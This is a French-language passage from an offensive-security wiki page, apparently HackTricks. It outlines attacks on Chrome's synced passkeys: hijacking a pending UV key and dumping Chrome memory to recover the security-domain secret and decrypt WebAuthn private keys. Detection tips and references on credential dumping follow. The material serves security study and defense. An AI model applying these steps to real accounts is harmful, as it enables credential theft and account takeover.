2. **Détournement de clé UV en attente**<sup>[[4]](#references)</sup>
   - Forcer une nouvelle configuration en supprimant `passkey_enclave_state` ou en envoyant une opération `device/forget` signée valide.
   - Si la configuration laisse l’appareil à l’état **`uv_key_pending`**, enregistrer une clé publique UV contrôlée par l’attaquant.
   - Si le fournisseur ne vérifie pas l’attestation / l’origine matérielle sécurisée de la nouvelle clé UV, les signatures ultérieures de la clé de l’attaquant sont considérées comme **`UV=1`**.
3. **Vol du secret maître / récupération SDS**<sup>[[4]](#references)</sup>
   - Forcer une récupération ou une réintégration afin que Chrome récupère le secret maître des passkeys synchronisées.
   - Surveiller la recréation ou la modification de `passkey_enclave_state`, puis vider la mémoire de Chrome lorsque le **secret du domaine de sécurité (SDS)** en clair s’y trouve.
   - Utiliser le SDS récupéré pour déchiffrer les champs chiffrés de chaque enregistrement `WebauthnCredentialSpecifics` et récupérer les clés privées WebAuthn portables.

### Pistes DFIR / détection

- Surveiller la **suppression/recréation** de `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Déclencher une alerte en cas d’accès anormal à **`Sync Data\LevelDB`** de Chrome par des processus autres que le navigateur.
- Déclencher une alerte en cas de **vidage de la mémoire de Chrome** ou d’accès suspect à la mémoire entre processus.
- Enquêter sur les demandes répétées de **code PIN de récupération Google Password Manager** ou sur une nouvelle configuration inattendue.
- Garder à l’esprit que le **`signCount`** WebAuthn est souvent peu utile pour les passkeys synchronisées, car il peut rester constant ; la détection classique des clones est donc peu efficace.

## References

- [1] [Unit 42 – Enquête sur des années d’opérations passées inaperçues ciblant des secteurs de haute valeur](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo : hameçonnage par macro VBA Word via SMTP → déchiffrement des identifiants hMailServer → CVE-2023-27532 Veeam vers SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Au cœur d’Ink Dragon : révélation du réseau de relais et du fonctionnement interne d’une opération offensive furtive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey : une nouvelle surface d’attaque dans l’authentification sans mot de passe](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / stockage de clés CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Comment fonctionne réellement le magasin de données Active Directory : au cœur de NTDS.dit (partie 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Extraction à distance des mots de passe de Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho étoffe son arsenal de cyberespionnage avec le toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Fonction CreateFileW et `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Mode de sauvegarde Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [FAQ Telegram – mettre fin aux sessions actives](https://telegram.org/faq)
- [14] [Microsoft Learn : Remote Credential Guard et Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn : protection et gestion des identifiants](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
{{#include ../../banners/hacktricks-training.md}}
